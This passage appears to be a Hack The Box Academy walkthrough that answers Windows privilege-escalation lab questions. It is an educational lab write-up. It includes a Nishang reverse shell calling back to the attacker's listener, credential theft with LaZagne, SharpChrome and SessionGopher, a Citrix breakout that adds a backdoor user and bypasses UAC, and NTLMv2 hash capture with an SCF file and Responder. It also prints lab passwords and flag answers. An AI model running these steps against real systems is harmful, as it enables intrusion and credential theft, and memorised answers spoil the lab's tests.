-------  ------    -----      -----     ------     --  -- -----------
    143       9     1420       6476              3416   0 inSyncCPHwnet64
```

Additionally, students can run one last command to verify that the `Druva InSync` service is running:

Code: powershell

```powershell
get-service | ? {$_.DisplayName -like 'Druva*'}
```

```powershell-session
PS C:\Users\htb-student> get-service | ? {$_.DisplayName -like 'Druva*'}

Status   Name               DisplayName
------   ----               -----------
Running  inSyncCPHService   Druva inSync Client Service
```

Afterward, students need to download `Invoke-PowerShellTcp.ps1` from its [GitHub repo](https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1) to Pwnbox/`PMVPN` and rename it to `shell.ps1`, then add the following line at the bottom of the script:

Code: powershell

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress PWNIP -Port PWNPO
```

![Windows_Privilege_Escalation_Walkthrough_Image_13.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_13.png)

Then, students need to start a Python HTTP server in the same directory as the `shell.ps1` file:

Code: shell

```shell
python3 -m http.server PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ python3 -m http.server 8080

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

Back to the Windows target, students need to use File Explorer to navigate to `C:\Tools` and then edit the `Druva.ps1` script with `Notepad`, replacing the IP address and port with that of Pwnbox/`PMVPN` where the Python HTTP server is listening:

![Windows_Privilege_Escalation_Walkthrough_Image_14.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_14.png)

After saving the changes, students need to go back to Pwnbox/`PMVPN` and start another `nc` listener, specifying the same port number that was used in the `shell.ps1` script (`9443` in here):

Code: shell

```shell
nc -lvnp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ nc -lvnp 9443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::9443
Ncat: Listening on 0.0.0.0:9443
```

On the Windows target, students need to go back to PowerShell, navigate to `C:\Tools` and run the `Druva.ps1` script:

Code: powershell

```powershell
.\Druva.ps1
```

```powershell-session
PS C:\Tools> .\Druva.ps1

22
4
4
316
```

After the `Druva.ps1` script has executed, students will notice that a reverse shell session has been established successfully in the `nc` listener:

```shell-session
Ncat: Connection from 10.129.43.44.
Ncat: Connection from 10.129.43.44:55778.
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\WINDOWS\system32>
```

At last, students need to print out the flag file "flag.txt", which is under the directory `C:\Users\Administrator\Desktop\VulServices\`:

Code: powershell

```powershell
type C:\Users\Administrator\Desktop\VulServices\flag.txt
```

```powershell-session
PS C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\VulServices\flag.txt

Aud1t_th0se_th1rd_paRty_s3rvices!
```

Answer: `Aud1t_th0se_th1rd_paRty_s3rvices!`

# Credential Hunting

## Question 1

### "Search the file system for a file containing a password. Submit the password as your answer."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to open PowerShell and navigate to the `C:\Users` directory:

Code: powershell

```powershell
cd C:\Users
```

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Users\htb-student> cd C:\Users
```

Subsequently, students need to use `findstr` to hunt for files containing the string `password`:

Code: powershell

```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

```powershell-session
PS C:\Users> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

All Users\Druva\inSync4\users\HTB-STUDENT\inSync.cfg
All Users\Microsoft\IdentityCRL\INT\wlidsvcconfig.xml
All Users\Microsoft\IdentityCRL\production\wlidsvcconfig.xml
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2010Win32.xml
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2010Win64.xml
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013Win32.xml
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013Win64.xml
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2016Win32.xml
All Users\Microsoft\UEV\InboxTemplates\MicrosoftOffice2016Win64.xml
htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt
htb-student\AppData\Local\Google\Chrome\User Data\ZxcvbnData\1\passwords.txt
htb-student\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\85D6DEAK\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_27[1].txt

<SNIP>

htb-student\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\ConstraintIndex\Settings_{a3b4ee7e-9311-44f1-9742-e9e47a210ea4}\0.0.filtertrie.intermediate.txt
htb-student\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\LocalState\DeviceSearchCache\SettingsCache.txt
htb-student\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
htb-student\Documents\stuff.txt
Public\Documents\settings.xml
```

Students need to explore the output and dig around the specified files, eventually finding the password hidden in `\Public\Documents\settings.xml`:

Code: powershell

```powershell
type .\Public\Documents\settings.xml
```

```powershell-session
PS C:\Users> type .\Public\Documents\settings.xml
<?xml version="1.0" encoding="UTF-8"?>

<!--
Licensed to the Apache Software Foundation (ASF) under one
or more contributor license agreements.  See the NOTICE file
distributed with this work for additional information
regarding copyright ownership.  The ASF licenses this file
to you under the Apache License, Version 2.0 (the
"License"); you may not use this file except in compliance
with the License.  You may obtain a copy of the License at

<SNIP>

  <!-- proxies
   | This is a list of proxies which can be used on this machine to connect to
   | the network. Unless otherwise specified (by system property or command-
   | line switch), the first proxy specification in this list marked as active
   | will be used.
   |-->

  <proxies>
    <proxy>
      <id>myproxy</id>
      <active>true</active>
      <protocol>http</protocol>
      <host>proxy.inlanefreight.local</host>
      <port>8080</port>
      <username>proxyadmin</username>
      <password>Pr0xyadm1nPassw0rd!</password>
      <nonProxyHosts>*.google.com|ibiblio.org</nonProxyHosts>
    </proxy>
  </proxies>
```

From the contents of the file, students will find the password `Pr0xyadm1nPassw0rd!`.

Answer: `Pr0xyadm1nPassw0rd!`

# Credential Hunting

## Question 2

### "Connect as the bob user and practice decrypting the credentials in the pass.xml file. Submit the contents of the flag.txt on the desktop once you are done."

Students are highly encouraged to practice decrypting the `pass.xml` file.

Students need to connect to the spawned target with `xfreerdp` using the credentials `bob:Str0ng3ncryptedP@ss!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:bob /p:Str0ng3ncryptedP@ss!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:bob /p:Str0ng3ncryptedP@ss!

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Students will find the flag file "flag.txt" on the desktop:

![Windows_Privilege_Escalation_Walkthrough_Image_15.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_15.png)

Answer: `3ncryt10n_w0nt_4llw@ys_s@v3_y0u`

# Other Files

## Question 1

### "Using the techniques shown in this section, find the cleartext password for the bob_adm user on the target system."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.44 /u:htb-student /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to open PowerShell, navigate to the `C:\Tools\PSSQLite\` directory, and use the `Set-ExecutionPolicy` Cmdlet:

Code: powershell

```powershell
cd C:\Tools\PSSQLite\
Set-ExecutionPolicy Bypass -Scope Process
```

```powershell-session
PS C:\Users\htb-student> cd C:\Tools\PSSQLite\
PS C:\Tools\PSSQLite> Set-ExecutionPolicy Bypass -scope Process

Execution Policy Change
The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose you to the security risks described in the about_Execution_Policies help topic at
https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is "N"): A
Set-ExecutionPolicy : Windows PowerShell updated your execution policy successfully, but the setting is overridden by a policy defined at a more specific scope.  Due to the override, your shell will retain its current effective execution policy of Unrestricted. Type "Get-ExecutionPolicy -List" to view your execution policy settings. For more
information please see "Get-Help Set-ExecutionPolicy".
At line:1 char:1
+ Set-ExecutionPolicy Bypass -scope Process
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (:) [Set-ExecutionPolicy], SecurityException
    + FullyQualifiedErrorId : ExecutionPolicyOverride,Microsoft.PowerShell.Commands.SetExecutionPolicyCommand
```

Now that students have changed the execution policy, they can import the `PSSQLite` module, providing "R" as input when prompted:

Code: powershell

```powershell
Import-Module .\PSSQLite.psd1
```

```powershell-session
PS C:\Tools\PSSQLite> Import-Module .\PSSQLite.psd1

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your
computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning
message. Do you want to run C:\Tools\PSSQLite\PSSQLite.psm1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R
```

At last, students need to use `Invoke-SqliteQuery` to discover the cleartext password for `bob_adm`, inside of the SQLite database located at `C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`:

Code: powershell

```powershell
$db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap
```

Code: session

```powershelll-session
PS C:\Tools\PSSQLite> $db = 'C:\Users\htb-student\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite'
PS C:\Tools\PSSQLite> Invoke-SqliteQuery -Database $db -Query "SELECT Text FROM Note" | ft -wrap

Text
----
\id=de368df0-6939-4579-8d38-0fda521c9bc4 vCenter
\id=e4adae4c-a40b-48b4-93a5-900247852f96
\id=1a44a631-6fff-4961-a4df-27898e9e1e65 root:Vc3nt3R_adm1n!
\id=c450fc5f-dc51-4412-b4ac-321fd41c522a Thycotic demo tomorrow at 10am
\id=e30f6663-29fa-465e-895c-b031e061a26a Network
\id=c73f29c3-64f8-4cfc-9421-f65c34b4c00e
\id=69b4fc18-ae09-4226-af90-175ff4092b79 bob_adm:1qazXSW@3edc!
```

From the output of `Invoke-SqliteQuery`, students will know that the password of the user `bob_adm` is `1qazXSW@3edc!`.

Answer: `1qazXSW@3edc!`

# Further Credential Theft

## Question 1

### "Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefrieght.local user account."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `jordan:HTB_@academy_j0rdan!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:jordan /p:HTB_@academy_j0rdan!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.93.224 /u:jordan /p:HTB_@cademy_j0rdan! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to open PowerShell, navigate to the `C:\Tools` directory, and run `lazagne.exe` with the `all` option:

Code: powershell

```powershell
cd C:\Tools
.\lazage.exe all
```

```powershell-session
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\jordan> cd C:\Tools\
PS C:\Tools> .\lazagne.exe all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


###### User: jordan #######

------------------- Winscp passwords -----------------
[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Dbvis passwords -----------------
[+] Password found !!!
Name: SQL01.inlanefreight.local
Driver:
	  SQL Server (Microsoft JDBC Driver)

Host: localhost
Login: sa
Password: S3cret_db_p@ssw0rd!
```

From the output of `lazagne`, students will know that the password for the `sa` user is `S3cret_db_p@ssw0rd!`.

Answer: `S3cret_db_p@ssw0rd!`

# Further Credential Theft

## Question 2

### "Which user has credentials stored for RDP access to the WEB01 host?"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.93.224 /u:htb-student /p:HTB_@cademy_stdnt!

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Once the RDP session launches, students need to search for `Remote Desktop`:

![Windows_Privilege_Escalation_Walkthrough_Image_16.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_16.png)

After selecting `Remote Desktop Connection`, students need to enter `WEB01` for the Computer name:

![Windows_Privilege_Escalation_Walkthrough_Image_17.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_17.png)

Students will notice that the user name `amanda` automatically populates.

Answer: `amanda`

# Further Credential Theft

## Question 3

### "Find and submit the password for the root user to access \https://vc.inlanefreight.local/ui/login"

Using the previously established RDP session, students need to open PowerShell, navigate to the `C:\Tools` directory, and run `SharpChrome.exe`:

Code: powershell

```powershell
cd C:\Tools
.\SharpChrome.exe logins /unprotect
```

```powershell-session
PS C:\Users\htb-student> cd C:\Tools\
PS C:\Tools> .\SharpChrome.exe logins /unprotect
  __                 _
 (_  |_   _. ._ ._  /  |_  ._ _  ._ _   _
 __) | | (_| |  |_) \\_ | | | (_) | | | (/_
                |
  v1.11.1

[*] Action: Chrome Saved Logins Triage
[*] Triaging Chrome Logins for current user
[*] AES state key file : C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Local State
[*] AES state key : D72790F4972C4D5700D8D2ED50D21850A3429373534ED938EB009219A51A0479

[X] Error : 0

---  Credential (Path: C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data) ---

file_path,signon_realm,origin_url,date_created,times_used,username,password
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,https://vc.inlanefreight.local/,https://vc
.inlanefreight.local/ui/login,5/26/2021 12:09:51 PM,13266529791618996,root,"?U?1`?l}?????A
?"
C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Login Data,http://vc01.inlanefreight.local:443/,http:
//vc01.inlanefreight.local:443/login.html,8/7/2021 6:33:01 PM,13272859981246714,root,ILVCadm1n1qazZAQ!
```

From the output of `SharpChrome`, students will know that the password for the root user is `ILVCadm1n1qazZAQ!`.

Answer: `ILVCadm1n1qazZAQ!`

# Further Credential Theft

## Question 4

### "Enumerate the Host and find the password for ftp.ilfreight.local"

Using the previously established RDP session, students need to open PowerShell, navigate to the `C:\Tools` directory, import the `SessionGopher` module, and then invoke it, specifying the target as `WINLPE-SRV01`:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01
```

```powershell-session
PS C:\Users\htb-student> cd C:\Tools\
PS C:\Tools> Import-Module .\SessionGopher.ps1
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01

          o_
         /  ".   SessionGopher
       ,"  _-"
     ,"   m m
  ..+     )      Brandon Arvanaghi
     `m..m       Twitter: @arvanaghi | arvanaghi.com

[+] Digging on WINLPE-SRV01...
WinSCP Sessions

Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings
Hostname :
Username :
Password :

Source   : WINLPE-SRV01\htb-student
Session  : root@ftp.ilfreight.local
Hostname : ftp.ilfreight.local
Username : root
Password : Ftpuser!
```

From the output of `SessionGopher`, students will know that the password of `ftp.ilfreight.local` is `Ftpuser!`.

Answer: `Ftpuser!`

# Citrix Breakout

## Question 1

### "Submit the user flag from C:\\Users\\pmorgan\\Downloads"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution
```

```shell-session
┌─[eu-academy-1]─[10.10.14.69]─[htb-ac-594497@htb-2czyskr233]─[~]
└──╼ [★]$ xfreerdp /v:10.129.4.180 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution 

[18:47:57:621] [4981:4982] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[18:47:57:621] [4981:4982] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[18:47:57:635] [4981:4982] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[18:47:57:635] [4981:4982] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[18:47:57:636] [4981:4982] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
```

Next, students need to open a web browser and navigate to http://humongousretail.com/remote/:

![Windows_Privilege_Escalation_Walkthrough_Image_18.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_18.png)

When the website loads, students need to select `Skip to Log on`:

![Windows_Privilege_Escalation_Walkthrough_Image_19.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_19.png)

Students need to log in as `pmorgan:Summer1Summer!` with the `htb.local` domain:

![Windows_Privilege_Escalation_Walkthrough_Image_20.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_20.png)

After successfully logging in, students need to select `Default`, triggering the download of `launch.ica`:

![Windows_Privilege_Escalation_Walkthrough_Image_21.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_21.png)

![Windows_Privilege_Escalation_Walkthrough_Image_22.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_22.png)

Subsequently, students need select `Open File` from inside of Firefox, using the `launch.ica` file to connect to the restricted environment:

![Windows_Privilege_Escalation_Walkthrough_Image_23.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_23.png)

Upon connecting, students will land inside a restricted Windows 7 environment. Next, students need to run `Paint` , taking advantage of the `Open` dialogue box to access the `pmorgan` users directory:

![Windows_Privilege_Escalation_Walkthrough_Image_24.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_24.png)

![Windows_Privilege_Escalation_Walkthrough_Image_25.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_25.png)

Selecting `All Files`, students need to enter the UNC path `\\127.0.0.1\c$\users\pmorgan` for the File name, and then click `Open`:

![Windows_Privilege_Escalation_Walkthrough_Image_26.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_26.png)

Finally, students need to navigate to the `Downloads` directory and right-click to open `flag.txt`:

![Windows_Privilege_Escalation_Walkthrough_Image_27.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_27.png)

![Windows_Privilege_Escalation_Walkthrough_Image_28.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_28.png)

Launching the file with notepad, students will see the contents of the flag:

![Windows_Privilege_Escalation_Walkthrough_Image_29.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_29.png)

Answer: `CitR1X_Us3R_Esc@p3`

# Citrix Breakout

## Question 2

### "Submit the user flag from C:\\Users\\pmorgan\\Downloads"

Continuing from the previously established RDP session, students need to open a terminal, then start an SMB server from inside the `Tools` directory:

![Windows_Privilege_Escalation_Walkthrough_Image_30.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_30.png)

Code: shell

```shell
cd Tools/
sudo su
smbserver.py -smb2support share $(pwd)
```

```shell-session
htb-student@ubuntu:~$ cd Tools/
htb-student@ubuntu:~/Tools$ sudo su

[sudo] password for htb-student: 

root@ubuntu:/home/htb-student/Tools# smbserver.py -smb2support share $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

```

Next, students need to return to the `Default` Citrix environment and open Paint again, this time trying to open `\\10.13.38.95\share` as the File name:

![Windows_Privilege_Escalation_Walkthrough_Image_31.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_31.png)

Consequently, students need to right-click to open `pwn.exe`, launching a Command Prompt from within the restricted environment:

![Windows_Privilege_Escalation_Walkthrough_Image_32.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_32.png)

Now, students need to upgrade to a `powershell` session, while navigating to `C:\users\public` so they may copy over the `PowerUp.ps1` and `Bypass-UAC.ps1` scripts: Subsequently, students need to use the `Write-UserAddMSI` cmdlet to facilitate the creation of a `.msi` file:

Code: cmd

```cmd
powershell -ep bypass
cd c:\users\public
xcopy \\10.13.38.95\share\PowerUp.ps1 .
xcopy \\10.13.38.95\share\Bypass-UAC.ps1 .
Import-Module .\PowerUp.ps1
Write-UserAddMSI
```

![Windows_Privilege_Escalation_Walkthrough_Image_33.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_33.png)

Students need to run `UserAdd.msi` , creating a new user with the credentials `backdoor:T3st@123`

```cmd-session
.\userAdd.msi
```

![Windows_Privilege_Escalation_Walkthrough_Image_34.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_34.png)

Now, students need to use `runas` to launch a Command Prompt as the `backdoor` user:

Code: cmd

```cmd
runas /user:backdoor cmd
```

![Windows_Privilege_Escalation_Walkthrough_Image_35.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_35.png)

Finally, from the newly created Command Prompt, students need to bypass UAC using `Bypass-UAC.ps1`:

Code: cmd

```cmd
powershell -ep bypass
cd C:\users\public
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -method UacMethodSysprep
```

![Windows_Privilege_Escalation_Walkthrough_Image_36.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_36.png)

Launching a new `powershell` session, students need to read the contents of the flag.txt file on the Administrator's desktop:

Code: powershell

```powershell
type C:\Users\Administrator\Desktop\flag.txt
```

![Windows_Privilege_Escalation_Walkthrough_Image_37.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_37.png)

Answer: `C1tr!x_3sC@p3_@dm!n`

# Interacting with Users

## Question 1

### "Using the techniques in this section obtain the cleartext credentials for the SCCM\_SVC user."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! 
[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

If students are on `PMVPN`, they need to install `Responder`:

Code: shell

```shell
sudo apt-get install responder
```

In a new terminal tab, students then need to start `Responder` and begin listening on the `tun0` interface:

Code: shell

```shell
sudo responder -wrf -v -I tun0
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ sudo responder -wrf -v -I tun0

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
```

From the established RDP session, students need to open `Notepad`:

![Windows_Privilege_Escalation_Walkthrough_Image_38.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_38.png)

Students then need to paste in the following `Shell Command File` code:

Code: scf

```scf
[Shell]
Command=2
IconFile=\\PWNIP\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```

![Windows_Privilege_Escalation_Walkthrough_Image_39.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_39.png)

Then, students need to click on `File` -> `Save As` and use the file explorer to navigate to `C:\Department Shares\Public\IT` and save the file as `@Inventory.scf`:

![Windows_Privilege_Escalation_Walkthrough_Image_40.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_40.png)

Once the file has been saved to the share, students need to wait a few seconds before checking `Responder`:

```shell-session
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.43.43
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\sccm_svc
[SMB] NTLMv2-SSP Hash     : sccm_svc::WINLPE-SRV01:56b7db45129a0f1b:8C330EC5261EB404018D09836A3E5489:0101000000000000806F517410D8D8016F601E0B25F40357000000000200080053004F004800390001001E00570049004E002D00380050005100480057004D004700510031005000340004003400570049004E002D00380050005100480057004D00470051003100500034002E0053004F00480039002E004C004F00430041004C000300140053004F00480039002E004C004F00430041004C000500140053004F00480039002E004C004F00430041004C0007000800806F517410D8D801060004000200000008003000300000000000000001000000002000005C311F12855ED01487A75BB882F916B5E7444170865781CAC6CF397FB50B48EA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0038003000000000000000000000000000
```

Students have now intercepted the `NTLMv2` hash. After saving it to a file it can be cracked using `Hashcat` with hashmode 5600:

Code: shell

```shell
